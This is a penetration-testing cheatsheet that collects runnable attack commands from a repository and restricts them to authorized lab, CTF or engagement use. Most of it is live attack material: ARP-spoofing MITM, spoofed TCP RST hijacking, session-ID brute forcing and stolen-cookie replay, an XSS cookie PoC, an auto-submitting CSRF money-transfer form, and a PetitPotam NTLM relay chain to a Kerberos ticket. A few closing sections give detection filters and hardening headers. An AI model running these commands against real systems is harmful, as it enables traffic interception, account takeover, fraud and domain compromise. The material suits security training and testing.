# Cheatsheet — All Commands in This Repository

Every real, runnable command referenced across this repository, grouped by task, in one place. All commands assume **authorized lab, CTF, or engagement-scoped use only**.

## Table of Contents
- [Reconnaissance & Sniffing](#reconnaissance--sniffing)
- [ARP / Network-Level MITM](#arp--network-level-mitm)
- [RST / TCP Hijacking](#rst--tcp-hijacking)
- [Session-ID Brute Forcing](#session-id-brute-forcing)
- [XSS / Cookie Theft (PoC)](#xss--cookie-theft-poc)
- [CSRF Proof-of-Concept](#csrf-proof-of-concept)
- [PetitPotam / AD NTLM Relay Chain](#petitpotam--ad-ntlm-relay-chain)
- [bettercap Workflow](#bettercap-workflow)
- [SSL Stripping](#ssl-stripping)
- [DNS over HTTPS](#dns-over-https)
- [Vulnerability Scanning](#vulnerability-scanning)
- [Wireshark Display Filters](#wireshark-display-filters)
- [Defensive Headers](#defensive-headers)

---

## Reconnaissance & Sniffing

```bash
# Wireshark — capture live traffic on an interface (GUI equivalent: just hit Start)
wireshark -i eth0 -k

# tcpdump — capture and save a pcap for later analysis in Wireshark
sudo tcpdump -i eth0 -w capture.pcap

# tcpdump — watch TCP handshakes and flags live
sudo tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn|tcp-ack|tcp-rst) != 0'
```

## ARP / Network-Level MITM

```bash
# Poison the victim's ARP cache to believe you are the gateway
sudo arpspoof -i eth0 -t 192.168.1.50 192.168.1.1

# Poison the gateway's ARP cache to believe you are the victim
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.50

# Equivalent one-shot MITM using ettercap
sudo ettercap -T -q -M arp:remote /192.168.1.50// /192.168.1.1//
```

## RST / TCP Hijacking

```bash
# Craft a spoofed RST packet using hping3, appearing to come from the
# server, with a predicted ACK number, aimed at the victim
sudo hping3 -c 1 -R -a 192.168.0.200 -s 80 -p 51820 -M 1429725024 192.168.0.100
```

## Session-ID Brute Forcing

```bash
# Brute-force a small numeric session-ID space via a URL parameter
for i in $(seq -w 0 9999); do
  curl -s -o /dev/null -w "%{http_code} $i\n" "http://target.example/view/$i"
done

# Replay a captured/stolen session cookie directly
curl -s "https://target.example/account" \
  -H "Cookie: JSESSIONID=8FEB0A58F1E3E898E342E07ADA12714A"
```

## XSS / Cookie Theft (PoC)

```html
<!-- Minimal PoC to confirm reflected/stored XSS and expose the cookie -->
<SCRIPT>alert(document.cookie);</SCRIPT>
```

## CSRF Proof-of-Concept

```html
<!-- Hosted on an attacker-controlled page; auto-submits on load -->
<form action="https://bank.example/transfer" method="POST" id="csrf-poc">
  <input type="hidden" name="to_account" value="ATTACKER_ACCOUNT_NUMBER">
  <input type="hidden" name="amount" value="5000">
</form>
<script>document.getElementById('csrf-poc').submit();</script>
```

## PetitPotam / AD NTLM Relay Chain

```bash
# 1. Identify the certificate authority
certutil.exe

# 2. Stand up an HTTP/SMB relay listener (Impacket)
ntlmrelayx.py -t <URL of Certificate authority with web enrolment> \
  -smb2support --adcs --template DomainController

# 3. Coerce the DC into authenticating to your listener (with credentials)
python3 PetitPotam.py -d <CA name> -u <Username> -p <Password> \
  <Listener-IP> <IP of DC>

# 3b. Credential-less variant, if the DC is vulnerable
python3 PetitPotam.py <Attacker's IP> <IP of DC>

# 4. Use the resulting NTLM hashes with Rubeus to grab a Kerberos TGT
Rubeus.exe asktgt /outfile.kirbi /dc:<DC-IP> /domain:<domain name> \
  /user:<Domain username> /ptt /certificate:<NTLM hashes received from above command>
```

## bettercap Workflow

```bash
# Launch on a given interface
sudo bettercap -iface eth0
```
```text
# Inside the interactive shell:
net.probe on
net.recon on
set arp.spoof.targets 192.168.1.50
arp.spoof on
net.sniff on
```

## SSL Stripping

```bash
# Classic sslstrip usage (paired with iptables redirection + ARP spoofing)
sslstrip -l 8080
```

## DNS over HTTPS

```bash
# Query via Cloudflare's DoH resolver instead of plaintext DNS
curl -s -H 'accept: application/dns-json' \
  'https://cloudflare-dns.com/dns-query?name=example.com&type=A'
```

## Vulnerability Scanning

```bash
# Wapiti (free/open source)
wapiti -u https://target.example --scope domain

# OWASP ZAP baseline scan (free/open source, CI/CD-friendly)
docker run -t owasp/zap2docker-stable zap-baseline.py -t https://target.example
```

## Wireshark Display Filters

```text
arp.opcode == 2                    # Duplicate/unexpected ARP replies
arp.opcode == 1                    # ARP request flood (recon before spoofing)
tcp.flags.reset == 1               # TCP resets — possible RST hijacking
tcp.analysis.retransmission        # Retransmissions — desync symptom
tcp.analysis.duplicate_ack         # Duplicate ACKs — ACK-storm symptom
http.cookie and not tcp.port == 443  # Cleartext session cookies
http.set_cookie                    # Inspect Set-Cookie headers for missing flags
```

## Defensive Headers

```http
# Hardened session cookie
Set-Cookie: sessionid=8f3e9a1c4b2d7f60; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=1800

# HSTS — force HTTPS for a year, including subdomains, and opt into preload lists
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# Prevent caching of sensitive pages
Cache-Control: no-cache, no-store
Pragma: no-cache
```